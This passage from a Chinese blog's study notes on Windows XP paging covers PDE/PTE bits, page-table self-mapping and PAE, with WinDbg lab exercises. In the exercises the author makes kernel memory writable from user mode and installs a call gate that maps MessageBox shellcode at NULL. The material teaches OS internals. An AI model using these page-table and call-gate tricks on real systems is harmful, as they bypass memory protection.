<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span>* szBuffer = <span class="string">&quot;Const Zone Read/Write&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;常量字符串的地址为：0x%08X\n&quot;</span>,szBuffer);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;常量字符串为：%s\n&quot;</span>,szBuffer);</span><br><span class="line">  getchar();	<span class="comment">//修改改线性地址转换后的物理地址的PDE、PTE的R/W位为1</span></span><br><span class="line">  </span><br><span class="line">  szBuffer[<span class="number">4</span>] = <span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;常量字符串为：%s\n&quot;</span>,szBuffer);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>在XP中运行VC6，得到常量字符串的地址：0x00423054。</p>
<p><img data-src="https://s2.loli.net/2021/12/31/loYHnQ8Zr2PRqbx.png" alt="17.png"></p>
</li>
<li><p>按10-10-12拆分线性地址0x00423054：</p>
<ul>
<li>10：0000 0000 01 &#x3D; 0x1 * 4 &#x3D; 0x4</li>
<li>10：00 0010 0011 &#x3D; 0x23 * 4 &#x3D; 0x8C</li>
<li>12：0x54</li>
</ul>
</li>
<li><p>使用<code>!process 0 0</code>获取CR3的值：0x2d86f000。</p>
</li>
<li><p><code>!dd 0x2d86f000+0x4</code>获取PDE：PDE &#x3D; 0x2e24c867，R&#x2F;W位为1。</p>
</li>
<li><p><code>!dd 0x2e24c000+0x8C</code>获取PTE：PTE &#x3D; 0x2d92f025，R&#x2F;W位为0。</p>
<p><img data-src="https://s2.loli.net/2021/12/31/C3xvlZpuRbkgPyQ.png" alt="18.png"></p>
</li>
<li><p>将PTE的R&#x2F;W位修改为1，<code>!ed 2e24c08c 0x2d92f027</code>。</p>
</li>
<li><p>回到XP中继续执行代码。</p>
<p><img data-src="https://s2.loli.net/2021/12/31/ve68U5VCRWmAihI.png" alt="19.png"></p>
</li>
</ol>
<h3 id="6-3-U-x2F-S位-2"><a href="#6-3-U-x2F-S位-2" class="headerlink" title="6.3 U&#x2F;S位[2]"></a>6.3 U&#x2F;S位[2]</h3><p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p>U&#x2F;S位（User&#x2F;Supervisor），分别为普通用户&#x2F;超级用户。</p>
<div class="note default"><ul>
<li>U&#x2F;S &#x3D; 1，该页权限为<strong>普通用户</strong>可访问。</li>
<li>U&#x2F;S &#x3D; 0，该页权限为<strong>特权用户</strong>可访问。</li>
</ul>
</div>

<p>U&#x2F;S标志与R&#x2F;W标志和CR0寄存器中的WP标志共同起作用。</p>
<p><strong>总结：</strong></p>
<ol>
<li>2G以上是内核才能访问的原因是U&#x2F;S位的设置问题，如果将内核的某个页设置为1就可以在R3访问了。</li>
<li>0、1、2是系统环，<mark class="label success">可以访问系统页和用户页</mark>（0环是特权级环）</li>
<li>1、2环虽然不是特权级环，但是是系统环。</li>
<li>3环是用户环，<mark class="label warning">仅可以访问用户页</mark>。</li>
</ol>
<h4 id="6-3-1-练习：在R3访问高2G内存"><a href="#6-3-1-练习：在R3访问高2G内存" class="headerlink" title="6.3.1 练习：在R3访问高2G内存"></a>6.3.1 练习：在R3访问高2G内存</h4><p>3环的代码仅能访问低2G的原因，是因为高2G的线性地址对应的物理页<code>PDE_U/S &amp; PDE_U/S = 0</code>，修改相应的位使<strong>与</strong>后的结果为1即可在3环访问。</p>
<p>练习：修改一个高2G线性地址的PDE&#x2F;PTE属性，实现Ring3可读写。比如：0x8003F00C</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  PDWORD pR3_Number = (PDWORD)<span class="number">0x8003F00C</span>;</span><br><span class="line">  getchar();	<span class="comment">//进入Windbg修改线性地址0x8003F00C对应的PDE、PTE的U/S位为1</span></span><br><span class="line">  *pR3_Number = <span class="number">12345678</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;地址0x8003F00C存储的值为：%d\n&quot;</span>,*pR3_Number);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>按10-10-12分页拆分线性地址：0x8003F00C</p>
<ul>
<li>10：1000 0000 00 &#x3D; 10 0000 0000 &#x3D; 0x200 * 4 &#x3D; 0x800</li>
<li>10：00 0011 1111 &#x3D; 0x3F * 4 &#x3D; 0xFC</li>
<li>12：0xC</li>
</ul>
</li>
<li><p>在XP的VC6中直接运行代码，报错如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/31/ODxmpZTCLzM2Glf.png" alt="20.png"></p>
</li>
<li><p>重新在XP的VC6中运行代码。</p>
<ol>
<li><code>!process 0 0</code>获取CR3的值：0x3493a000。</li>
<li><code>!dd 0x3493a000+0x800</code>获取PDE的值：0x0003b163，U&#x2F;S位为0。</li>
<li><code>!dd 0x0003b000+0xFC</code>获取PTE的值：0x0003f163，U&#x2F;S位为0。</li>
</ol>
</li>
<li><p>将PDE、PTE的U&#x2F;S位置1。</p>
<ul>
<li><code>!ed 0x3493a800 0x0003b167</code></li>
<li><code>!ed 0x0003b0fc 0x0003f167</code></li>
</ul>
<p><img data-src="https://s2.loli.net/2021/12/31/27BaFVOxgfeI1Hv.png" alt="21.png"></p>
</li>
<li><p>回到XP中继续执行代码。</p>
<p>结果仍然还是不能读写高2G的地址，重启了几遍还是没能成功，但是同样的方法，其他人是可以成功的。目前还没有找到解决方法。</p>
<p><strong>已经找到方法解决</strong>：原因是TLB（可以看后面TLB的内容了解TLB），首先看到PDE、PTE中下标8即第9位的G &#x3D; 1。</p>
<ul>
<li>PDE中的PS &#x3D; 0，此时是小页，G位无效。</li>
<li>PTE中的G &#x3D; 1，说明原来的TLB中有线性地址0x8003F00C的缓存（物理地址）。</li>
</ul>
<p>故这里修改后运行失败，若先将PTE的G位清零（<code>invlpg dword ptr ds:[0x8003F00C]</code>），再修改PTE即可成功。</p>
</li>
</ol>
<h3 id="6-4-A位-5"><a href="#6-4-A位-5" class="headerlink" title="6.4 A位[5]"></a>6.4 A位[5]</h3><p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p>A（Accessed）位是标记是否被访问（读或者写）过。访问过置1 即使只访问一个字节也会导致PDE PTE置1</p>
<div class="note warning"><ul>
<li>A &#x3D; 1，该页物理内存<strong>被访问过</strong>。</li>
<li>A &#x3D; 0，该页物理内存<strong>未被访问过</strong>。</li>
</ul>
</div>

<p>这个标志是个“粘性”标志，就是说一旦被设置，处理器不会隐式的给它清零。<br>只有软件能清零该位。内存管理软件使用访问位和脏位（D位）来调度页或者页表进出物理内存。</p>
<h3 id="6-5-D位-PTE-6"><a href="#6-5-D位-PTE-6" class="headerlink" title="6.5 D位(PTE)[6]"></a>6.5 D位(PTE)[6]</h3><p>D位（Dirty）位仅存在于PTE下标为6的位，PDE中该位保留（Reserve），为0。</p>
<div class="note danger"><p>D位指明该页是否曾经被写入过：</p>
<ul>
<li>D &#x3D; 1，该页物理内存<strong>被写入过</strong>。</li>
<li>D &#x3D; 0，该页物理内存<strong>未被被写入过</strong>。</li>
</ul>
<p>内存管理软件使用访问位（A）和脏位（D）来调度页或者页表进出物理内存。</p>
</div>

<p>这个标志是一个粘性标志，就是说，一旦被设置，处理器不会隐式的对它清零。只有软件可以对它清零。</p>
<h3 id="6-6-PS位-PDE-、PAT-PTE-7"><a href="#6-6-PS位-PDE-、PAT-PTE-7" class="headerlink" title="6.6 PS位(PDE)、PAT(PTE)[7]"></a>6.6 PS位(PDE)、PAT(PTE)[7]</h3><p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p><strong>P&#x2F;S位[PDE7]</strong></p>
<p>P&#x2F;S位（Page Size）确定页的大小，仅对PDE有意义。</p>
<div class="note warning"><ul>
<li>P&#x2F;S &#x3D; 1，页大小为<strong>4MB</strong>，此时不存在页表，低22位为一页（1024*4096）。</li>
<li>P&#x2F;S &#x3D; 0，页大小为<strong>4KB</strong>。</li>
</ul>
<p>P&#x2F;S &#x3D; 1时，线性地址只能拆成2段：大小为4MB ，俗称“大页”。</p>
</div>

<p><strong>PAT位[PTE7]</strong></p>
<p>PAT位（Page Table Attribute Index）页属性表，在奔腾I处理器中采用这个标志用来选择PAT项。</p>
<div class="note default"><ul>
<li>PAT &#x3D; 1，这个标志与PCD和PWT标志一起，被用来选取PAT项。</li>
<li>PAT &#x3D; 0，<strong>该位目前保留</strong>。</li>
</ul>
</div>

<h3 id="6-7-G-8-、PET-3-、PCD-4"><a href="#6-7-G-8-、PET-3-、PCD-4" class="headerlink" title="6.7 G[8]、PET[3]、PCD[4]"></a>6.7 G[8]、PET[3]、PCD[4]</h3><p>学完控制寄存器与TLB才能讲，此处略过。</p>
<h3 id="6-8-有效位-9-10-11"><a href="#6-8-有效位-9-10-11" class="headerlink" title="6.8 有效位[9 10 11]"></a>6.8 有效位[9 10 11]</h3><p>有效位在发生缺页时（<strong>PTE的P&#x3D;0</strong>）使用。分以下四种情况（具体可见内存管理-无处不在的缺页异常）。关于这部分知识，等以后学习了内存管理的缺页异常就知道了，这里简单介绍一下。</p>
<p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/01/JLsmQIGSwDN4YlA.png" alt="22.png"></p>
<h2 id="7-页目录表基址"><a href="#7-页目录表基址" class="headerlink" title="7 页目录表基址"></a>7 页目录表基址</h2><p>CR3中存储的是物理地址，不能在程序中直接读取的。如果想读取，也要把CR3的值挂到PDT和PTT中才能访问，那么怎么通过线性地址访问PDT和PTT呢？</p>
<div class="note default"><p>在10-10-12分页模式下的PDT表：</p>
<ol>
<li>PDT表实际上是PTT表中的一张表，刚好是第0x300张。</li>
<li>PDT表共1024个PDE项，每一项指向一张PTT表，其中第0x300项PDE指向自身。</li>
<li>在代码中可以通过线性地址<code>0xC0300000</code>来得到PDT表的基址。</li>
</ol>
</div>

<p><img data-src="https://s2.loli.net/2022/01/02/ukwKTxjbW3BUSfm.png" alt="23.png"></p>
<div class="note warning"><p>关于PDT表的基址有以下结论：</p>
<ol>
<li>通过线性地址<mark class="label danger">0xC0300000</mark>找到的物理页就是<strong>页目录表</strong>。</li>
<li>这个物理页即是页目录表本身也是页表，PDT表实际上就是PTT表中的一张。</li>
<li>页目录表是一张特殊的页表，每一项PTE指向的不是普通的物理页，而是指向其他的页表。</li>
<li>如果我们要访问第N个PDE，那么有如下公式：$0xC0300000 + N*4 $ 。</li>
</ol>
</div>



<h2 id="8-页表基址"><a href="#8-页表基址" class="headerlink" title="8 页表基址"></a>8 页表基址</h2><p>既然有线性地址<mark class="label warning">0xC0300000</mark>指向PDT，且它是PTT表的第0x300张，一张表大小为1000h。则线性地址<mark class="label warning">0xC0000000</mark>指向PTT表的基址。</p>
<p>则地址0xC0001000为第2张PTT表，到Windbg中查确实如此。</p>
<div class="note success"><p>在10-10-12分页模式下的PTT表：</p>
<ol>
<li>页表被映射到了从0xC0000000到0xC03FFFFF的4M地址空间。</li>
<li><strong>1024张页表的线性地址是连续的，但物理地址不连续</strong></li>
<li>在这1024个表中有一张特殊的表：<strong>页目录表</strong>。</li>
<li>页目录被映射到了0xC0300000开始处的4K地址空间。</li>
</ol>
</div>

<p><strong>关于PDT、PTT表的结论：</strong></p>
<p>掌握了这两个地址，就掌握了一个进程所有的物理内存读写权限。</p>
<div class="note danger"><p><strong>公式：</strong></p>
<ol>
<li>什么是PDI与PTI：10-10-12 <ul>
<li>10：PDI</li>
<li>10：PTI</li>
</ul>
</li>
<li>访问页目录表项(PDE)的公式：$0xC0300000 + PDI*4$</li>
<li>访问页表项(PTE)的公式：$0xC0000000 + PDI*4096 + PTI*4$</li>
</ol>
</div>



<h2 id="9-练习：在NULL地址执行ShellCode"><a href="#9-练习：在NULL地址执行ShellCode" class="headerlink" title="9 练习：在NULL地址执行ShellCode"></a>9 练习：在NULL地址执行ShellCode</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE ShellCode[] = &#123;<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0xE8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line">VOID __declspec(naked) CallGate_SetPDEPTE()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">      </span><br><span class="line">		lea eax,ShellCode;</span><br><span class="line">		mov ebx,eax;</span><br><span class="line">		mov ecx,dword ptr ds:[<span class="number">0xC0300000</span>];</span><br><span class="line">		test ecx,ecx;	<span class="comment">//该处如果去挂PDE会发生失败，不知道为啥，AND</span></span><br><span class="line">		je __SetPDE;	<span class="comment">//实际代码运行的时候是jne，因为PDE不是0</span></span><br><span class="line">    </span><br><span class="line">		<span class="comment">//挂PTE</span></span><br><span class="line">		<span class="comment">//PTE = 0xC0000000 + PDI*4096 + PTI*4</span></span><br><span class="line">		<span class="comment">//4096 = 2^12</span></span><br><span class="line">		shr ebx,<span class="number">22</span>;</span><br><span class="line">		<span class="keyword">and</span> ebx,<span class="number">0x3FF</span>;		<span class="comment">//PDI</span></span><br><span class="line">		shl ebx,<span class="number">12</span>;     	<span class="comment">//PDI*4096</span></span><br><span class="line">		lea eax,ShellCode;</span><br><span class="line">		shr eax,<span class="number">12</span>;</span><br><span class="line">		<span class="keyword">and</span> eax,<span class="number">0x3FF</span>;		<span class="comment">//PTI</span></span><br><span class="line">		shl eax,<span class="number">2</span>;	    	<span class="comment">//PTI*4</span></span><br><span class="line">		add eax,<span class="number">0xC0000000</span>;	<span class="comment">//0xC0000000 + PTI*4</span></span><br><span class="line">		add eax,ebx;		<span class="comment">//eax = PTE = 0xC0000000 + PTI*4 + PDI*4096</span></span><br><span class="line">    </span><br><span class="line">		mov eax,dword ptr ds:[eax];</span><br><span class="line">		mov dword ptr ds:[<span class="number">0xC0000000</span>],eax;<span class="comment">//将ShellCode_PTE挂到NULL的PTE上去</span></span><br><span class="line">    </span><br><span class="line">		jmp __RET3;</span><br><span class="line">      </span><br><span class="line">	__SetPDE:</span><br><span class="line">		<span class="comment">//将线性地址ShellCode的PDE挂到NULL地址的PDE上去</span></span><br><span class="line">		<span class="comment">//ShellCode_PDE = 0xC0300000 + PDI*4</span></span><br><span class="line">		<span class="comment">//取线性地址高10位（PDI）</span></span><br><span class="line">		shr eax,<span class="number">22</span>;</span><br><span class="line">		<span class="keyword">and</span> eax,<span class="number">0x3FF</span>;			<span class="comment">//将多余的位清零仅保留最高10位</span></span><br><span class="line">		shl eax,<span class="number">2</span>;			<span class="comment">//PDI*4</span></span><br><span class="line">		add eax,<span class="number">0xC0300000</span>;		<span class="comment">//0xC0300000 + PDI*4</span></span><br><span class="line">    </span><br><span class="line">		mov edx,dword ptr ds:[eax];</span><br><span class="line">		mov dword ptr ds:[<span class="number">0xC0300000</span>],edx;<span class="comment">//将ShellCode_PDE挂到NULL的PDE上去</span></span><br><span class="line">    </span><br><span class="line">	__RET3:</span><br><span class="line">		popfd;</span><br><span class="line">		popad;</span><br><span class="line">		retf;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//填充E8 Call的代码 = 目的地址 - 返回地址（当前代码长度+当前代码基址）</span></span><br><span class="line">	DWORD dwOffset = (DWORD)ShellCode &amp; <span class="number">0xFFF</span>;</span><br><span class="line">	*(PDWORD)&amp;ShellCode[<span class="number">9</span>] = (DWORD)MessageBox - (<span class="number">13</span>+dwOffset);</span><br><span class="line">	BYTE CallGate[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	DWORD dwShellCode = (DWORD)ShellCode;</span><br><span class="line">	<span class="comment">//*(PDWORD)&amp;ShellCode[9] = (DWORD)MessageBox - (13+dwShellCode);</span></span><br><span class="line">  </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;CallGate_SetPDEPTE地址：%08X，MessageBox的地址：%08X\n&quot;</span>,(DWORD)CallGate_SetPDEPTE,(DWORD)MessageBox);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请在windbg执行: eq 8003f048 %04xec00`0008%04x\n&quot;</span>, ((DWORD)CallGate_SetPDEPTE&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0x0000FFFF</span>,\</span><br><span class="line">         (DWORD)CallGate_SetPDEPTE &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">  </span><br><span class="line">	getchar();</span><br><span class="line">	__asm</span><br><span class="line">	  &#123;</span><br><span class="line">		call fword ptr ds:[CallGate];</span><br><span class="line">		call dwOffset;</span><br><span class="line">	  &#125;</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/03/yIhRYajNOdwM6Zt.png" alt="24.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>保护模式</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 页保护（二）</title>
    <url>/post/WinXP-ProtectionMode-Page2/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-2-9-9-12分页"><a href="#1-2-9-9-12分页" class="headerlink" title="1 2-9-9-12分页"></a>1 2-9-9-12分页</h2><p>2-9-9-12分页结构（PAE，物理地址扩展）：</p>
<ul>
<li>12：页的大小是确定的，4KB不能随便改，所以12确定了。</li>
<li>9：如果想增大物理内存的访问范围，就需要增大<strong>PTE</strong>，增大到36位，考虑对齐的因素，增加到<strong>8个字节</strong>。4KB &#x3D; 512*8 &#x3D; 1024*4，512 &#x3D; 2^ 9。<mark class="label success">PTI</mark></li>
<li>9：如果PTE所在物理地址超过4GB，则同样也需要一个超过32位的PDE来进行寻址，考虑内存对齐，则PDE也是8字节。<mark class="label success">PDI</mark></li>
<li>2：2  &#x3D;  32 -（12+9+9），还剩2位，所以就再做一级叫<mark class="label success">PDPI</mark>。</li>
</ul>
<div class="note warning"><p>这里需要注意物理地址和线性地址：32位CPU的线性地址范围是32位，大小为4GB。在10-10-12分页模式下，物理地址和线性地址大小相等为4GB，那么在多进程情况下就需要不停的进行换物理页，为了节省换页的开销，Intel设计了2-9-9-12分页。但是Windows在这种分页模式下仅使用了36位来进行寻址方式，2^ 36 &#x3D; 64GB。注意：</p>
<ul>
<li>2-9-9-12分页模式下，线性地址范围还是4GB。</li>
<li>物理地址范围为64GB。</li>
<li>物理地址范围和内存条大小无关，有可能此时内存条大小仅为2GB。</li>
<li>物理地址大小由8字节的PTE中的36位来决定。</li>
<li>PDE也是8字节是因为PTE所在的物理页的物理地址可能超过4GB，同时考虑内存对齐。</li>
</ul>
</div>

<p><img data-src="https://s2.loli.net/2022/01/04/fdXsiAlHnm3PZ18.png" alt="25.png"></p>
<p>其中：<strong>CR3、物理页数据是以32位存放，PDPTE、PDE、PTE为64位</strong>。</p>
<h3 id="1-1-开启2-9-9-12分页"><a href="#1-1-开启2-9-9-12分页" class="headerlink" title="1.1 开启2-9-9-12分页"></a>1.1 开启2-9-9-12分页</h3><ul>
<li>10-10-12分页：将<code>C:\boot.ini</code>文件中的<code>noexecute</code>改为<code>execute</code>重启。</li>
<li>2-9-9-12分页：将<code>C:\boot.ini</code>文件中的<code>execute</code>改为<code>noexecute</code>重启。</li>
</ul>
<h3 id="1-2-PDPE-2"><a href="#1-2-PDPE-2" class="headerlink" title="1.2 PDPE(2)"></a>1.2 PDPE(2)</h3><p>由于CR3是32位的，所以PDPTE所在物理页的<strong>物理地址</strong>范围是0-4GB。</p>
<p>PDPT表（页目录指针表）是2-9-9-12分页模式下的线性地址的高两位，共组成四项PDPTE。<strong>PDPE结构</strong>如下：</p>
<p><img data-src="https://s2.loli.net/2022/01/05/l6JxzEvBt4Q9Kpa.png" alt="26.png"></p>
<p>每个PDPTE为8字节：</p>
<ol>
<li>0～11：属性，也是PDE的偏移。</li>
<li>9～11：给操作系统用的，CPU不用。</li>
<li>12～35：PDT的基址，把低12位补0，<mark class="label primary">0-35：共36位为PDT基址</mark>。</li>
<li>36～63：保留位，保留位并不意味着填0就行了，而是CPU要用的，但是我们不能用，并且CPU用了还不会告诉我们怎么用的。</li>
</ol>
<h3 id="1-3-PDE-9"><a href="#1-3-PDE-9" class="headerlink" title="1.3 PDE(9)"></a>1.3 PDE(9)</h3><p>每个PDT表（页目录表）大小为4KB，共512个PTE，每个PTE为8字节。</p>
<p>PDE根据PS位来区分是大页还是小页：</p>
<ul>
<li>PS &#x3D; 1：大页，剩下的9+12&#x3D;21位，即2^ 21&#x3D;2MB为 1 页。此时PDE中的G位才有意义：<ul>
<li>G &#x3D; 1，表示全局页，是多个进程共享的，与TLB相关。</li>
<li>G &#x3D; 0，非全局页（独享页），如VirtualAlloc申请的内存。</li>
</ul>
</li>
<li>PS &#x3D; 0，PDE指向页表，每个物理页大小4KB，<strong>此时G位是无效位，一直为0</strong>。</li>
</ul>
<p><strong>G&#x3D;1，即为全局页，进程（CR3）切换时，TLB中的记录不会被刷新。</strong></p>
<p>4KB物理页下：<mark class="label primary">0-35：共36位为PTT基址</mark></p>
<p><strong>PDE</strong>大页、小页的结构图如下：（低36位为页表基址）</p>
<p><img data-src="https://s2.loli.net/2022/01/05/ORKa3UlpH4bzMGy.png" alt="27.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/05/1p5tfOjRWld64Fk.png" alt="28.png"></p>
<ul>
<li><p>VirtualAlloc申请的内存是独享内存，仅当前进程可用</p>
</li>
<li><p>CreateFileMapping申请的是共享物理页，所有进程都可以使用，如放DLL的内存</p>
</li>
</ul>
<h3 id="1-4-PTE-9"><a href="#1-4-PTE-9" class="headerlink" title="1.4 PTE(9)"></a>1.4 PTE(9)</h3><p>PTT表（页表），PTE结构如下：</p>
<p><img data-src="https://s2.loli.net/2022/01/05/OxFfnzJ3oUtXakI.png" alt="29.png"></p>
<p>PTE中35-12是物理页基址，24位，低12位补0：<mark class="label primary">物理页基址+12位的页内偏移指向具体数据，共36位</mark>。<strong>具体的物理数据是按32位存放的</strong>。</p>
<h3 id="1-5-XD标志位-63"><a href="#1-5-XD标志位-63" class="headerlink" title="1.5 XD标志位[63]"></a>1.5 XD标志位[63]</h3><mark class="label warning">在PAE分页模式下，PDE与PTE的最高位为XD/NX位</mark>，AMD中称为NX位,即No Excetion。<mark class="label danger">DEP</mark>就是PDE、PTE最高位X位。（DEP保护）

<p><img data-src="https://s2.loli.net/2022/01/05/LTKSrXAn5W1oD9P.png" alt="30.png"></p>
<p>段的属性有可读、可写和可执行。<br>页的属性有可读、可写。<br>所以，Intel就做了硬件保护（保护数据），做了一个不可执行位：</p>
<ul>
<li>XD &#x3D; 1：该物理页数据不可执行。即使软件溢出了也没有关系，即使你的EIP蹦到了危险的“数据区”，也是不可以执行的！</li>
</ul>
<h3 id="1-6-PDPTE、PDE、PTE的属性"><a href="#1-6-PDPTE、PDE、PTE的属性" class="headerlink" title="1.6 PDPTE、PDE、PTE的属性"></a>1.6 PDPTE、PDE、PTE的属性</h3><p>除了G位和XD位属性为OR外，其余属性为： <strong>PDPTE属性 &amp; PDE属性 &amp; PTE属性</strong>。</p>
<h3 id="1-7-PDT、PTT表"><a href="#1-7-PDT、PTT表" class="headerlink" title="1.7 PDT、PTT表"></a>1.7 PDT、PTT表</h3><p>2-9-9-12分页下的PDT、PTT表结构如下：</p>
<p><img data-src="https://s2.loli.net/2022/01/05/hQyL86o3Wae7XTR.png" alt="33.png"></p>
<p>根据示意图，<code>0xC0000000</code>是第一张页表的线性地址，<code>0xC0600000</code>是第一张页目录表的线性地址。</p>
<p>PDT表共4张，每张4KB。</p>
<div class="note info"><p>2-9-9-12：<br>PDPTI-PDI-PTI-OFFSET                    </p>
<p>公式：<br><strong>PDE &#x3D; 0xc0600000 + (PDPTI*4KB) + (PDI*8)</strong><br><strong>PTE &#x3D; 0xc0000000 + (PDPTI*2MB) + (PDI*4KB) + (PTI*8)</strong>                    </p>
<p>更高效的公式（MmIsAddressValid是这么干的）<br>PDE &#x3D; 0xc0600000 + ((addr &gt;&gt; 18) &amp; 0x3ff8)<br>PTE &#x3D; 0xc0000000 + ((addr &gt;&gt; 9) &amp; 0x7ffff8)</p>
</div>

<h3 id="1-8-练习：找一个线性地址对应的物理地址"><a href="#1-8-练习：找一个线性地址对应的物理地址" class="headerlink" title="1.8 练习：找一个线性地址对应的物理地址"></a>1.8 练习：找一个线性地址对应的物理地址</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  DWORD dwNumber = <span class="number">0x12345678</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;变量dwNumber的线性地址为：%p\n&quot;</span>,&amp;dwNumber);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>开启2-9-9-12分页：将XP<code>C:\boot.ini</code>文件中的<code>execute</code>改为<code>noexecute</code>重启。</li>
<li>运行程序，线性地址为：0x0012FF7C，进行2-9-9-12拆分：<ul>
<li>2：00 &#x3D; 0x0 * 8 &#x3D; 0x0</li>
<li>9：00 0000 000 &#x3D; 0x0 * 8 &#x3D; 0x0</li>
<li>9：1 0010 1111 &#x3D; 0x12F * 8 &#x3D; 0x978</li>
<li>12：0xF7C</li>
</ul>
</li>
<li>在Windbg中使用<code>!process 0 0</code>获取当前进程CR3的值：0x06e40340（4字节物理地址）<ol>
<li>查PDPTE：<code>!dq 0x06e40340 + 0x0</code>：00000000&#96;18403801。</li>
<li>查PDE：取PDPTE的低36位作为基址查PDE：0x018403801，然后将低12位属性清零，<code>!dq 0x018403000 + 0x0</code>：00000000&#96;184f1867。</li>
<li>查PTE：取PDE的低36位作为基址查PTE：0x0184f1867，然后将低12位属性清零，<code>!dq 0x0184f1000 + 0x978</code>：80000000&#96;1844c867。</li>
<li>查物理页中的数据：取PTE的低36位作为基址查物理页数据：0x01844c867，然后将低12位属性清零。因为物理页是4字节的：<code>!dd 0x01844c000 + 0xF7C </code>：12345678。</li>
</ol>
</li>
<li>使用 !vtop 指令验证线性地址转换为物理地址是否正确。<code>!vtop CR3 线性地址</code></li>
</ol>
<p><img data-src="https://s2.loli.net/2022/01/05/8dfahMQEwSyjNAn.png" alt="31.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/05/TrSBws7gEMZhaWb.png" alt="32.png"></p>
<h3 id="1-9-练习：给NULL挂上物理页"><a href="#1-9-练习：给NULL挂上物理页" class="headerlink" title="1.9 练习：给NULL挂上物理页"></a>1.9 练习：给NULL挂上物理页</h3><p>注意：如果NULL的PDE项不为0，则直接修改NULL的PTE即可。</p>
